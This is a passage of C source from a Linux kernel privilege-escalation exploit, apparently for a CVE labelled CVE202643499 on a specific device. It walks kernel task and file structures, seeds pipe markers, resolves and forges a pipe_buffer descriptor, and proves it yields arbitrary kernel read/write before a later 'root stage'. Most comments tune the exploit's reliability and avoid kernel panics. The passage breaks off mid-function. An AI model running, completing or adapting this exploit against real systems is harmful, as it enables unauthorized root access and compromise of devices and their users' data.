      if (!walk_read_fields(fd, task, PIPE_WALK_TASK_CACHE_SIZE, link_offs, 1, &link) ||
          !walk_ptr_ok((uintptr_t)link) || (uintptr_t)link == list_head) {
        rmg_diag("WALK list link unreadable at step=%d; stopping walk\n", i);
        break;
      }
      node = (uintptr_t)link;
      rmg_diag("WALK skipping unreadable task step=%d task=%016zx -> node=%016zx\n", i, task,
               node);
      continue;
    }
    uintptr_t next_node = (uintptr_t)tf[1]; /* walk backwards: tasks.prev */
    /* List-closing invariant, checked for free: the LAST task in the list must point its own
     * tasks.next back at the head. This used to cost a dedicated guarded read. */
    if (i == 0 && (uintptr_t)tf[0] != list_head) {
      rmg_diag("WALK list not closed: last task=%016zx tasks.next=%016zx want head=%016zx\n",
               task, (uintptr_t)tf[0], list_head);
      break;
    }
    uint32_t pid = (uint32_t)tf[2];
    int keep = ((pid_t)pid == want);
    if (i < 3 || keep) {
      rmg_diag("WALK step=%d task=%016zx pid=%u files=%016llx\n", i, task, pid,
               (unsigned long long)tf[3]);
    }
    if (keep) {
      self_files = (uintptr_t)tf[3];
      if (files_out) {
        *files_out = self_files;
      }
      rmg_diag("WALK found self task=%016zx pid=%u files=%016zx after %d steps\n", task,
               pid, self_files, i + 1);
      return task;
    }
    if (next_node == list_head) {
      break;
    }
    if (!walk_ptr_ok(next_node)) {
      rmg_diag("WALK node invalid step=%d node=%016zx\n", i, next_node);
      break;
    }
    node = next_node;
  }
  rmg_diag("WALK self task NOT found pid=%d\n", (int)want);
  return 0;
}


/* Resolve the pipe victim deterministically: walk init_task -> files -> fdtable ->
 * pipe_inode_info and pick a live buffer whose ops match anon_pipe_buf_ops. No heap
 * grooming and no SLUB scan, so it also avoids the order-3 child that panics most
 * often on this firmware. */
/* Give the walk a pipe that actually holds a buffer.
 *
 * The walk can read the pipe structures perfectly well, but every pipe it found
 * was empty (`head=0 tail=0 ring=0`), so there was nothing to claim. The fork
 * solves this with populate_pipe_markers(): write a marker of i+1 bytes into each
 * reclaim pipe so a pipe_buffer exists, then let the walk find it.
 *
 * The reclaim pipes are only allocated by the legacy prepare_pipe_buffer_page(),
 * which the walk deliberately skips, so allocate them here. Writing a small
 * payload leaves a live buffer with ops == anon_pipe_buf_ops, offset 0 and
 * PIPE_BUF_FLAG_CAN_MERGE - exactly the state the reclaim path wants. */
static int pipe_walk_populate_markers(void) {
  int created = 0;
  for (size_t i = 0; i < PIPE_RECLAIM; i++) {
    rmg_diag("WALK marker: i=%zu before fds=[%d,%d]\n", i, pipe_fds_reclaim[i][0],
             pipe_fds_reclaim[i][1]);
    /* These are zero-initialised statics, so an unused pair is {0,0} - and fd 0 is
     * a perfectly valid descriptor (stdin), which is why a write here returned
     * EBADF rather than doing something obvious. Test for "usable" explicitly. */
    if (pipe_fds_reclaim[i][0] <= 0 || pipe_fds_reclaim[i][1] <= 0) {
      /* alloc_pipe_object() only resizes an existing pipe (via fcntl F_SETPIPE_SZ);
       * it does not create one. The fds start at -1, so create the pipe first. */
      if (pipe(pipe_fds_reclaim[i]) != 0) {
        rmg_diag("WALK marker: pipe() failed at i=%zu errno=%d\n", i, errno);
        return 0;
      }
      alloc_pipe_object(pipe_fds_reclaim[i]);
      created++;
    }
    size_t want = i + 1;
    /* `want` runs up to PIPE_RECLAIM (240), so the buffer must be at least that big.
     * A 64-byte buffer meant 176 bytes of stack were read and written into a kernel
     * pipe for every i >= 64. The legacy population code at pipe.c:2230 sizes it
     * PAGE_SIZE; match that. */
    unsigned char marker[PIPE_RECLAIM];
    memset(marker, 'A' + (int)(i % 26), sizeof(marker));
    ssize_t w = write(pipe_fds_reclaim[i][1], marker, want);
    if (w != (ssize_t)want) {
      rmg_diag("WALK marker: write failed i=%zu want=%zu ret=%zd errno=%d\n", i,
               want, w, errno);
      return 0;
    }
  }
  rmg_diag("WALK markers written: %d pipes created, PIPE_RECLAIM=%d\n", created,
           PIPE_RECLAIM);
  return 1;
}

/* For one open fd: follow file->private_data -> pipe_inode_info, then scan the ring
 * page for a live pipe_buffer. Returns 1 on success (globals set), 0 to keep scanning. */
/* Read private_data for every file pointer that lands on one 4K page, under ONE guard.
 *
 * This is what replaced a stride-based batch. The measured distance between neighbouring
 * file objects on this device is 0x4d0, not the 0x100 we first assumed - and 0x100 is
 * impossible anyway, because sizeof(struct file) is 0x108, so objects that close would
 * overlap. Grouping by page needs no stride assumption at all, and a 4096-byte guarded read
 * is known to work here. One guard per distinct page of file objects instead of one per fd.
 *
 * Note the guard is sized to the read (PAGE_SIZE), not to the object (320): the synthetic
   * kmem_cache's usercopy window is `size`/`usersize`, and __check_heap_object allows
   * `offset + n <= usersize`. A 4096-byte read under a 264-byte window would abort. */
static int walk_read_file_page(int fd, uintptr_t page, const uintptr_t *files, size_t n,
                               uint64_t *priv_out) {
  unsigned char buf[PAGE_SIZE] __attribute__((aligned(16)));
  if (walk_read_bulk_page(fd, page, buf, PAGE_SIZE)) {
    int got = 0;
    for (size_t i = 0; i < n; i++) {
      if (files[i] < page ||
          files[i] + PIPE_WALK_FILE_CACHE_SIZE > page + PAGE_SIZE) {
        continue;
      }
      size_t at = (size_t)(files[i] - page) + PIPE_WALK_FILE_PRIVATE_OFF;
      if (at + 8 > PAGE_SIZE) {
        continue;
      }
      memcpy(&priv_out[i], buf + at, 8);
      got++;
    }
    return got;
  }

  /* The 4096-byte page read failed. Fall back to reading JUST the 8 bytes we need, under a
   * guard sized to the object (264 = BTF sizeof(file)) rather than the page.
   *
   * The page-sized read has no ladder - one marginal failure discarded every file on that
   * page - and a run would die on the same two slab pages over and over:
   *   WALK guarded file page read failed page=... n=1 latch=0
   * A 264-byte-window read of the single qword is far less exposed (it is the same width
   * the fork uses per file) and still returns exactly the value the caller needs, so the
   * page grouping stays a batching optimisation rather than a single point of failure. */
  g_guard_read_failures++;
  int got = 0;
  for (size_t i = 0; i < n; i++) {
    if (!walk_ptr_ok(files[i])) {
      continue;
    }
    if (walk_read_bulk_span(fd, files[i] + PIPE_WALK_FILE_PRIVATE_OFF, &priv_out[i],
                            PIPE_WALK_FILE_CACHE_SIZE)) {
      got++;
    }
  }
  rmg_diag("WALK file page read fell back to per-file spans page=%016zx n=%zu got=%d\n",
           page, n, got);
  return got;
}

/* bank_index is the index into pipe_fds_reclaim[] that this descriptor came from, and
 * that is what pipebuf_pipe_idx must hold: pipe_phys_read_data/pipe_phys_write_data use
 * it to pick the fd to drive (pipe.c:713, 737), and the legacy path sets it the same way
 * from the marker's length (pipe.c:536). The ring slot index is NOT that value - storing
 * it would make the proof and every later physrw call drive the wrong pipe. */
static int walk_try_fd_pipe(int fd, uint32_t bank_index, uint32_t fdi, uintptr_t file,
                            uintptr_t pinfo, uint64_t anon_ops) {
  if (!walk_ptr_ok(pinfo)) {
    return 0;
  }
  /* pipe_inode_info is read UNGUARDED, in small pieces, exactly as the reference does.
   *
   * This reverses an earlier decision in this file, and the reversal is the whole point. The
   * comment that used to sit here claimed the guard was MANDATORY for pinfo on this device,
   * because an unguarded read "HANGS: the run died with RD target=... len=80 and no pread
   * ret". That inference was wrong, and it cost us the reference's reliability:
   *
   *   - The reference never guards pinfo. Its walk calls slab_cache_guard_begin() in exactly
   *     four places - task, task(winner), files, file - and reads pinfo and the ring
   *     unguarded (09_pipe_buffer_rw.c:1673-1683). Its primitive, oss_kernel_read(), is the
   *     same configfs_read_once() AAR we already have: a raw virtual-address read with no
   *     direct_to_page() translation. FULL-EXECUTION-FLOW.md section 8 lists no guard step
   *     for the walk at all.
   *   - "No pread ret" plus a reboot is a kernel PANIC, not a hang. A panic is not a slow
   *     read that a guard would fix, and no retry survives one.
   *   - So the guard was not preventing a panic on pinfo; installing a fake slab_cache on
   *     pinfo's page - one of the hottest pages in the system, constantly allocated and freed
   *     - is a far better explanation for a panic than a plain read is. The window in which a
   *     concurrent allocation is misled is exactly what we were adding on every attempt.
   *
   * Width is not the discriminator either: 8-byte guarded reads went 3573/3573 clean while
   * the 20-byte pinfo read still panicked, so narrowing the guarded read bought nothing.
   *
   * Do not reintroduce a guard here. If pinfo ever fails to read, the correct responses are
   * the reference's: skip this fd (continue) and let the bounded 12-attempt walk ladder
   * re-run with a fresh pipe bank. */
  uint32_t head = 0, tail = 0, ring = 0;
  uint64_t bufs = 0;
  if (kernel_read_data(fd, pinfo + PIPE_WALK_PIPE_HEAD_OFF, &head, sizeof(head)) !=
          (ssize_t)sizeof(head) ||
      kernel_read_data(fd, pinfo + PIPE_WALK_PIPE_TAIL_OFF, &tail, sizeof(tail)) !=
          (ssize_t)sizeof(tail) ||
      kernel_read_data(fd, pinfo + PIPE_WALK_PIPE_RING_OFF, &ring, sizeof(ring)) !=
          (ssize_t)sizeof(ring) ||
      kernel_read_data(fd, pinfo + PIPE_WALK_PIPE_BUFS_OFF, &bufs, sizeof(bufs)) !=
          (ssize_t)sizeof(bufs)) {
    rmg_diag("WALK fd=%u pipe_inode_info read failed (skipping fd)\n", fdi);
    return 0;
  }
  uintptr_t bufs_ptr = (uintptr_t)bufs;
  /* head/tail are UNMASKED monotonic counters in Linux - they are never reduced mod
   * ring_size, they just wrap naturally and are masked only at dereference
   * (fs/pipe.c:61-66, "we use head and tail indices that aren't masked off, except at the
   * point of dereference"). So `head >= ring` is NOT a validity test; it would permanently
   * reject a pipe whose counters have passed 32. Only the ring size itself is checked,
   * exactly as upstream does (09_pipe_buffer_rw.c:1676). */
  if (ring == 0 || (ring & (ring - 1)) != 0 || !walk_ptr_ok(bufs)) {
    rmg_diag("WALK fd=%u bad ring ring=%u head=%u tail=%u\n", fdi, ring, head, tail);
    return 0;
  }
  /* The write primitive is only correct when the victim is the pipe's LAST allocated
   * buffer. pipe_write() merges into bufs[(head - 1) & mask] (fs/pipe.c:463), so with
   * occupancy != 1 that index is a different slot than the one we forged, and the forged
   * descriptor would be ignored - the write would land in some other buffer and still
   * report success. Upstream holds occupancy at exactly 1 by construction (one marker per
   * pipe, and its len+1 forge never advances tail), so assert the same invariant here
   * instead of silently writing to the wrong ring entry. */
  if ((head - tail) != 1u) {
    rmg_diag("WALK fd=%u ring occupancy=%u (want 1) head=%u tail=%u ring=%u\n", fdi,
             head - tail, head, tail, ring);
    return 0;
  }
  rmg_diag("WALK fd=%u file=%016zx pinfo=%016zx head=%u tail=%u ring=%u bufs=%016zx\n",
           fdi, file, pinfo, head, tail, ring, bufs);

  /* Read the ring in the fork's 0x400 chunks and match in user space.
   *
   * try_pipe_slab_candidates() copies the slab 0x400 bytes at a time under one guard.
   * Matching that chunk size matters: the guard's synthetic cache covers the read, so
   * the two widths have to agree. Whole-page reads and per-buffer reads both fault. */
  const size_t chunk = PIPE_WALK_SCAN_CHUNK;
  const size_t chunk_words = chunk / 8;
  uint64_t *pagebuf = calloc(chunk_words, sizeof(uint64_t));
  if (!pagebuf) {
    return 0;
  }
  int found = 0;
  /* Use the ONE live slot, not the first plausible one.
   *
   * The fork picks victim = bufs + (tail & (ring_size-1)) (09_pipe_buffer_rw.c:1683) and
   * then tests the descriptor structurally. Scanning from 0 for "anything that looks
   * plausible" diverges as soon as any slot is drained: a consumed slot keeps its page and
   * ops and only zeroes len, so a released descriptor passes a page+ops test and gets
   * forged, while pipe_read goes on to read the live one. The failure is silent, which is
   * exactly what the proof stage below now catches - but the index should just be right.
   *
   * tail is already read above, and the ring is a power of two. */
  uint32_t live = tail & (ring - 1);
  rmg_diag("WALK ring head=%u tail=%u ring=%u live_idx=%u\n", head, tail, ring, live);
  /* Test ONLY the one live slot. The fork computes a single victim
   * (09_pipe_buffer_rw.c:1683-1684); scanning forward from `live` re-introduces the "first
   * plausible candidate" pattern, and every other slot is either zeroed (len==0) or a
   * released buffer we must not forge. */
  for (uint32_t idx = live; idx == live && !found; idx++) {
    uintptr_t pb_addr = bufs + (size_t)idx * PIPE_WALK_PIPE_BUF_STRIDE;
    /* Read ONLY this one pipe_buffer, UNGUARDED - the reference does exactly this
     * (09_pipe_buffer_rw.c:1686-1688: oss_kernel_read of one struct oss_pipe_buffer at
     * bufs + (tail & (ring-1)) * stride). We were instead reading a whole PIPE_WALK_SCAN_CHUNK
     * (0x400) under a guard sized to that chunk, i.e. installing a fake cache that told the
     * kernel each object in that page was 1024 bytes when the real objects are 40-byte
     * pipe_buffers. That is precisely the "one oversized value left reads marginal" hazard:
     * every concurrent slab_free/slab_alloc on that page does arithmetic against the fake
     * size. It also cost a guard cycle to obtain 40 useful bytes.
     *
     * pipe_buffer is 0x28: page +0x00, offset +0x08, len +0x0c, ops +0x10, flags +0x18,
     * private +0x20. */
    uint8_t pb_bytes[PIPE_WALK_PIPE_BUF_STRIDE];
    memset(pb_bytes, 0, sizeof(pb_bytes));
    if (kernel_read_data(fd, pb_addr, pb_bytes, sizeof(pb_bytes)) !=
        (ssize_t)sizeof(pb_bytes)) {
      rmg_diag("WALK ring buffer read failed fd=%u pb=%016zx errno=%d\n", fdi, pb_addr, errno);
      break;
    }
    /* The fork's is_structural_pipe_candidate() (09_pipe_buffer_rw.c:1092-1099) requires all
     * six. We previously checked only two of them, which is why a released descriptor could
     * pass.
     *
     * offset and len are two u32 that SHARE one qword, so read that qword once and split it
     * rather than loading the halves independently. */
    uint64_t page; uint32_t boff; uint32_t blen; uint64_t ops; uint32_t bflags; uint64_t bpriv;
    memcpy(&page, pb_bytes + 0x00, 8);
    { uint64_t off_len; memcpy(&off_len, pb_bytes + 0x08, 8);
      boff = (uint32_t)off_len; blen = (uint32_t)(off_len >> 32); }
    memcpy(&ops, pb_bytes + 0x10, 8);
    { uint32_t f; memcpy(&f, pb_bytes + 0x18, 4); bflags = f; }
    memcpy(&bpriv, pb_bytes + 0x20, 8);
    if (ops != anon_ops) {
      continue;
    }
    if (boff != 0 || blen == 0 || blen > PIPE_RECLAIM) {
      rmg_diag("WALK ring slot %u rejected offset=%u len=%u ops=%016llx\n", idx, boff, blen,
               (unsigned long long)ops);
      continue;
    }
    if (blen != bank_index + 1) {
      /* Deterministic cross-check (fork: candidate.len != i+1, 09_pipe_buffer_rw.c:1689-1691).
       * populate_pipe_markers writes i+1 bytes into pipe i, so len == bank+1 proves this
       * descriptor is that pipe's pristine marker and binds it to the fd we will drive. */
      rmg_diag("WALK ring slot %u rejected len=%u bank=%u\n", idx, blen, bank_index);
      continue;
    }
    if (bflags != PIPE_BUF_FLAG_CAN_MERGE || bpriv != 0) {
      rmg_diag("WALK ring slot %u rejected flags=%#x private=%#llx\n", idx, bflags,
               (unsigned long long)bpriv);
      continue;
    }
    /* The fork's structural test: the buffer's page must be a vmemmap address. */
    if (page < VMEMMAP_START || page >= VMEMMAP_END) {
      continue;
    }
    pipebuf_addr = pb_addr;
    pipebuf_page_base = (uintptr_t)page;
    pipebuf_pipe_idx = (int)bank_index;
    /* Snapshot the pristine descriptor now, while pagebuf still holds it. This is the
     * restore baseline for every later forge; without it the forge would restore a
     * partially-consumed descriptor and the memcmp verification would compare the
     * mutation against itself. */
    pipebuf_saved.page = page;
    pipebuf_saved.offset = boff;
    pipebuf_saved.len = blen;
    pipebuf_saved.ops = ops;
    pipebuf_saved.flags = bflags;
    pipebuf_saved.pad = 0;
    pipebuf_saved.priv = bpriv;
    pipebuf_saved_valid = 1;
    rmg_diag("WALK RESOLVED fd=%u idx=%u pb=%016zx page=%016zx ops=%016llx len=%u "
             "flags=%#x\n",
             fdi, idx, pb_addr, pipebuf_page_base, (unsigned long long)ops, blen, bflags);
    found = 1;
  }
  free(pagebuf);
  return found;
}

/* Guard-cycle accounting is declared above slab_cache_guard_begin(). */

/* Number of times to retry the whole resolve. Each pass is a full re-walk; because the
 * reads are marginal this is far cheaper than it sounds, and a fresh pass re-reads the
 * task list rather than resuming a half-consumed one. */
#ifndef PIPE_WALK_PASSES
#define PIPE_WALK_PASSES 6
#endif

static int pipe_walk_resolve_pass(int fd);

int pipe_walk_resolve_deterministic(int fd) {
  /* Read-only probes: a failed read is not fatal, we simply try the next candidate.
   * Only a failed RESTORE (g_io_restore_failed) aborts, because that means the slab is
   * left pointing at a fake descriptor and continuing would compound the damage. */
  for (int pass = 0; pass < PIPE_WALK_PASSES; pass++) {
    g_guard_cycles = 0;
    g_guard_read_failures = 0;
    if (pipe_walk_resolve_pass(fd)) {
      rmg_diag("WALK resolved after %lu guard cycles (%lu read failures) pass=%d\n",
               g_guard_cycles, g_guard_read_failures, pass);
      return 1;
    }
    if (atomic_load(&g_io_restore_failed)) {
      rmg_diag("WALK terminal: restore failed, not retrying (pass=%d cycles=%lu)\n", pass,
               g_guard_cycles);
      return 0;
    }
    rmg_diag("WALK pass=%d found nothing after %lu guard cycles (%lu read failures), "
             "retrying\n",
             pass, g_guard_cycles, g_guard_read_failures);
  }
  rmg_diag("WALK gave up after %d passes\n", PIPE_WALK_PASSES);
  return 0;
}

static int pipe_walk_resolve_pass(int fd) {
  rmg_diag("WALK begin INIT_TASK=%016zx anon_ops=%016zx\n",
           PIPE_WALK_INIT_TASK_SLID, pipe_buf_ops_addr());
  /* Markers are written ONCE, here in the wrapper, not per pass.
   *
   * populate_pipe_markers() appends to each pipe. Re-running it on a retry pass would
   * put a SECOND buffer in the ring, which changes head/tail and the bufs[] contents the
   * scan is matching against - so a retry would be validating a different object each
   * time and could never converge. The fork populates once per attempt, creating a fresh
   * pipe bank each time; we keep the same pipes, so we must write once. */
  if (!g_markers_written) {
    if (!pipe_walk_populate_markers()) {
      rmg_diag("WALK marker population failed; continuing to scan anyway\n");
    }
    g_markers_written = 1;
  } else {
    rmg_diag("WALK markers already written; not rewriting for this pass\n");
  }
  uintptr_t files = 0;
  uintptr_t task = pipe_walk_find_self_task(fd, &files);
  if (!task) {
    rmg_diag("WALK no self task (latch=%d)\n", atomic_load(&g_io_restore_failed));
    return 0;
  }
  /* Publish the resolved self task so the root stage does not have to walk the task list a
   * second time. The walk already paid for it, and every extra pass over live task_structs
   * is another guard cycle opening the fake-kmem_cache window. */
  pipe_walk_self_task = task;
  pipe_walk_self_files = files;
  rmg_diag("WALK files=%016zx\n", files);
  if (!walk_ptr_ok(files)) {
    return 0;
  }
  /* The whole chain under ONE guard, which is exactly what the fork does.
   *
   * read_pipe_file_table() in the fork arms a single files_guard and then, still
   * holding it, reads files->fdt, fdt->fd_array and every reclaim fd's pointer out of
   * the array. Our earlier version armed a guard per page of fd_array, which is up to
   * 64 guards for the same bytes. The guard is what makes a direct-map AAR read
   * survivable at all, and it keeps working for addresses that are not inside the
   * guarded object, so holding it across the whole chain is both correct and ~60
   * cycles cheaper. */
  struct slab_cache_guard chain;
  if (!slab_cache_guard_begin(fd, files, PIPE_WALK_FILES_CACHE_SIZE, &chain)) {
    rmg_diag("WALK files guard begin failed latch=%d\n",
             atomic_load(&g_io_restore_failed));
    return 0;
  }
  const uintptr_t fdt_offs[1] = {PIPE_WALK_FILES_FDT_OFF};
  uint64_t fdtv[1] = {0};
  int fdt_ok = configfs_read_once(fd, files + PIPE_WALK_FILES_FDT_OFF, &fdtv[0], 8) == 8;
  const uintptr_t tbl_offs[2] = {PIPE_WALK_FDTABLE_FD_OFF, PIPE_WALK_FDTABLE_MAX_FDS};
  uint64_t tbl[2] = {0, 0};
  uintptr_t fdt = (uintptr_t)fdtv[0];
  int tbl_ok = 0;
  uint32_t max_fds = 0;
  if (fdt_ok && walk_ptr_ok(fdt)) {
    tbl_ok = configfs_read_once(fd, fdt + PIPE_WALK_FDTABLE_FD_OFF, &tbl[0], 8) == 8 &&
             configfs_read_once(fd, fdt + PIPE_WALK_FDTABLE_MAX_FDS, &tbl[1], 8) == 8;
    max_fds = (uint32_t)tbl[1];
  }
  uintptr_t fd_array = (uintptr_t)tbl[0];
  if (!slab_cache_guard_end(fd, &chain)) {
    rmg_diag("WALK terminal: files chain restore failed\n");
    return 0;
  }
  (void)fdt_offs;
  (void)tbl_offs;
  if (!fdt_ok || !tbl_ok) {
    g_guard_read_failures++;
    rmg_diag("WALK chain read failed fdt=%016zx latch=%d\n", fdt,
             atomic_load(&g_io_restore_failed));
    return 0;
  }
  rmg_diag("WALK fdt=%016zx fd_array=%016zx max_fds=%u\n", fdt, fd_array, max_fds);
  if (!walk_ptr_ok(fd_array) || max_fds == 0 || max_fds > 4096) {
    rmg_diag("WALK fdtable implausible max_fds=%u\n", max_fds);
    return 0;
  }
  uint64_t anon_ops = pipe_buf_ops_addr();
  /* Pull the whole fd table of file POINTERS under ONE guard.
   *
   * The fork loops over TARGET_PIPE_COUNT reading fd_array + pipe_fd*8 with every read
   * inside the one files_guard it armed for the chain. fd_array is a flat array of
   * pointers, so a contiguous span of it is just a span read: one guard, one transfer,
   * and the whole table in hand. We clamp to PIPE_WALK_MAX_FDS because max_fds can be
   * 2048 and the guard's cache size has to describe the read. */
  size_t want = max_fds;
  if (want > PIPE_WALK_MAX_FDS) {
    want = (size_t)PIPE_WALK_MAX_FDS;
  }
  size_t span = want * 8;
  /* Round the span up to a multiple of 8 and keep it inside one slab page's worth of
   * contiguous mapping; if it is too big for one guarded read, halve it and read in
   * passes. Each pass is one guard, but a pass covers many fds. */
  if (span > PIPE_WALK_MAX_SPAN) {
    span = PIPE_WALK_MAX_SPAN & ~(size_t)7;
    want = span / 8;
  }
  unsigned char *fdbuf = calloc(span, 1);
  if (!fdbuf) {
    return 0;
  }
  /* fd_array is read UNGUARDED, as the reference does.
   *
   * The reference's read_pipe_file_table() walks the fd table with plain oss_kernel_read
   * calls and arms nothing for it; its only guards are task (x2), files and file. We were
   * guarding the fd_array with a cache sized to the whole span (up to PIPE_WALK_MAX_SPAN
   * bytes), which again tells the kernel its objects are far larger than the real
   * fdtable-page objects. Unguard it - one less exposure window, and it costs nothing
   * because the guard was not what made the read succeed. */
  ssize_t fgot = kernel_read_data(fd, fd_array, fdbuf, span);
  int fdrestored = 1;
  rmg_diag("WALK fdtable span read ret=%zd want=%zu (unguarded)\n", fgot, want);
  if (!fdrestored) {
    rmg_diag("WALK terminal: fd_array restore failed\n");
    free(fdbuf);
    return 0;
  }
  if (fgot != (ssize_t)span) {
    g_guard_read_failures++;
    rmg_diag("WALK fdtable span read short, skipping scan latch=%d\n",
             atomic_load(&g_io_restore_failed));
    free(fdbuf);
    return 0;
  }
  /* The file OBJECTS those pointers refer to are read one PAGE at a time, under one
   * guard per page, and every pointer on that page yields its private_data from the
   * same copy. Grouping by page needs no stride assumption (the real stride measured
   * 0x4d0, not 0x100) and a 4K guarded read is known to work on this device. */
  /* Read ONLY the file pointers for fds we own, then group those objects by page.
   *
   * We used to scan every fd in the table (up to PIPE_WALK_MAX_FDS). Any fd that is not
   * ours belongs to another process, and it can be close()d while our guard is armed -
   * the object is freed to its slab, and our restore then writes a stale slab_cache into
   * a page that by then belongs to a different cache. The fork never has this problem
   * because it only ever touches its own 240 pipe fds. The fd NUMBERS are already known
   * to us in pipe_fds_reclaim, so selecting them costs nothing. */
  size_t nown = 0;
  uintptr_t *fptr = calloc((size_t)PIPE_RECLAIM, sizeof(uintptr_t));
  uint32_t *fnum = calloc((size_t)PIPE_RECLAIM, sizeof(uint32_t));
  /* Which pipe_fds_reclaim[] slot each pointer came from. The descriptor we resolve has
   * to be tied to the pipe whose fds we will actually drive, so the bank index travels
   * with the file pointer through the page grouping. */
  uint32_t *fbank = calloc((size_t)PIPE_RECLAIM, sizeof(uint32_t));
  if (!fptr || !fnum || !fbank) {
    free(fptr);
    free(fnum);
    free(fbank);
    free(fdbuf);
    return 0;
  }
  for (size_t p = 0; p < (size_t)PIPE_RECLAIM; p++) {
    int pfd = pipe_fds_reclaim[p][0];
    if (pfd <= 0 || (uint32_t)pfd >= want) {
      continue;
    }
    uint64_t file;
    memcpy(&file, fdbuf + (size_t)pfd * 8, sizeof(file));
    if (walk_ptr_ok((uintptr_t)file)) {
      fptr[nown] = (uintptr_t)file;
      fnum[nown] = (uint32_t)pfd;
      fbank[nown] = (uint32_t)p;
      nown++;
    }
  }
  rmg_diag("WALK fd scan: %zu own pipe fds live of %zu reclaim pairs (of %zu scanned)\n",
           nown, (size_t)PIPE_RECLAIM, want);
  /* Group the file objects by page and read one page per guard. Page grouping needs no
   * stride assumption (the measured neighbour stride is 0x4d0, and 0x100 is impossible
   * anyway since sizeof(struct file) is 0x108), and a 4K guarded read is known to work. */
  size_t i = 0;
  while (i < nown) {
    uintptr_t page = fptr[i] & ~(uintptr_t)(PAGE_SIZE - 1);
    size_t j = i;
    while (j < nown && (fptr[j] & ~(uintptr_t)(PAGE_SIZE - 1)) == page) {
      j++;
    }
    size_t cnt = j - i;
    uint64_t *priv = calloc(cnt, sizeof(uint64_t));
    if (priv) {
      if (walk_read_file_page(fd, page, fptr + i, cnt, priv) > 0) {
        for (size_t t = 0; t < cnt; t++) {
          if (walk_try_fd_pipe(fd, fbank[i + t], fnum[i + t], fptr[i + t],
                               (uintptr_t)priv[t], anon_ops)) {
            free(priv);
            free(fptr);
            free(fnum);
            free(fbank);
            free(fdbuf);
            return 1;
          }
          if (atomic_load(&g_io_restore_failed)) {
            rmg_diag("WALK terminal: restore latch set at fd=%u\n", fnum[i + t]);
            free(priv);
            free(fptr);
            free(fnum);
            free(fbank);
            free(fdbuf);
            return 0;
          }
        }
      }
      free(priv);
    }
    i = j;
  }
  free(fptr);
  free(fnum);
  free(fbank);
  free(fdbuf);
  rmg_diag("WALK no reclaim pipe resolved to a live buffer\n");
  return 0;
}

/* Prove that the resolved pipe_buffer descriptor actually yields arbitrary access, before
 * anyone acts on it.
 *
 * The fork makes this mandatory (09_pipe_buffer_rw.c:1801: resolve AND prove). Resolving a
 * descriptor only proves we can read it; it does not prove that forging it and calling
 * read()/write() on the pipe copies the bytes we expect. That is the entire exploit, and
 * if it silently does not work we would hand a broken primitive to the root stage.
 *
 * We seed a known tag in our own payload page, read it back through the forged pipe, then
 * overwrite it and read again. Both must match. This is the same shape as the fork's
 * prove_pipe_rw() but scoped to one tag, because the purpose here is to catch a wrong
 * descriptor or a wrong vmemmap base, not to benchmark the primitive. */
static int pipe_walk_prove_descriptors(int fd) {
  if (!pipebuf_addr || pipebuf_pipe_idx < 0 ||
      (size_t)pipebuf_pipe_idx >= (size_t)PIPE_RECLAIM) {
    rmg_diag("PROVE no descriptor resolved\n");
    return 0;
  }
  if (page_base == 0) {
    rmg_diag("PROVE no payload page to prove against\n");
    return 0;
  }
  /* page_base is the ORDER-3 reclaimed page. Assert the alignment rather than assume it:
   * for an unaligned base the old `(base & ~0xfff) + 0x40` walks BACKWARDS out of the
   * allocation and lands on foreign memory. */
  if ((page_base & (uintptr_t)(PAGE_SIZE - 1)) != 0 ||
      page_base > UINTPTR_MAX - ORDER3_SIZE) {
    rmg_diag("PROVE payload base not page aligned or overflows base=%016zx\n", page_base);
    return 0;
  }
  /* PIPE_WALK_PROOF_OFF is a cleared band inside the reclaimed page. It must not collide
   * with anything the payload already occupies: the fake file_operations (+0x1180), the
   * CFI scratch, the fake kmem_cache descriptor, the waiters, or the root-stage work/data
   * at +0x6000/+0x6200. Containment and single-page are both hard preconditions of
   * pipe_phys_read/write, so assert them rather than hope. */
  uintptr_t proof_addr = page_base + PIPE_WALK_PROOF_OFF;
  if (!is_direct_ptr(proof_addr) || proof_addr < page_base ||
      proof_addr + PIPE_WALK_PROOF_MAX > page_base + ORDER3_SIZE ||
      (proof_addr & (uintptr_t)(PAGE_SIZE - 1)) + PIPE_WALK_PROOF_MAX > PAGE_SIZE) {
    rmg_diag("PROVE proof_addr=%016zx outside the payload allocation\n", proof_addr);
    return 0;
  }
  /* "READPROOF" and "WRITEPROOF" differ in length, so hand-counting a matching suffix is
   * exactly how the trailing byte of a write ends up untested. Use one wire length and
   * NUL-pad both tags into fixed buffers. Mirrors the fork's paired-tag _Static_assert
   * (09_pipe_buffer_rw.c:1392). */
  static const char kReadTag[] = "CVE202643499-PIPE-RW-READPROOF-OK";
  static const char kWriteTag[] = "CVE202643499-PIPE-RW-WRITEPROOF-OK";
  enum { kTagLen = sizeof(kWriteTag) }; /* the longer of the two, including the NUL */
  const size_t taglen = (size_t)kTagLen;
  /* fs/pipe.c:460 computes chars = total_len & (PAGE_SIZE-1); if that is 0 the merge
   * block is skipped and write() allocates a NEW ring slot and bumps head instead, so the
   * write "succeeds" into a zeroed buffer. Our length must take the merge path. */
  _Static_assert((taglen & (size_t)(PAGE_SIZE - 1)) != 0,
                 "proof length must take the pipe_write merge path");
  _Static_assert(taglen <= PIPE_WALK_PROOF_MAX, "proof tag must fit the reserved band");
  unsigned char rtag[kTagLen];
  unsigned char wtag[kTagLen];
  unsigned char rbuf[kTagLen];
  unsigned char wbuf[kTagLen];
  memset(rtag, 0, sizeof(rtag));
  memset(wtag, 0, sizeof(wtag));
  memcpy(rtag, kReadTag, sizeof(kReadTag) - 1);
  memcpy(wtag, kWriteTag, sizeof(kWriteTag) - 1);
  memset(rbuf, 0, sizeof(rbuf));
  memset(wbuf, 0, sizeof(wbuf));

  if (kernel_write_data(fd, proof_addr, rtag, taglen) != (ssize_t)taglen) {
    rmg_diag("PROVE seed write failed errno=%d\n", errno);
    return 0;
  }
  if (!pipe_phys_read_data(fd, proof_addr, rbuf, taglen)) {
    rmg_diag("PROVE read path failed\n");
    return 0;
  }
  if (memcmp(rbuf, rtag, taglen) != 0) {
    rmg_diag("PROVE read MISMATCH got=%.*s\n", (int)taglen, (char *)rbuf);
    return 0;
  }
  rmg_diag("PROVE read ok addr=%016zx len=%zu\n", proof_addr, taglen);

  if (kernel_write_data(fd, proof_addr, wtag, taglen) != (ssize_t)taglen) {
    rmg_diag("PROVE reseed write failed errno=%d\n", errno);
    return 0;
  }
  if (!pipe_phys_write_data(fd, proof_addr, wtag, taglen)) {
    rmg_diag("PROVE write path failed\n");
    return 0;
  }
  if (!pipe_phys_read_data(fd, proof_addr, wbuf, taglen)) {
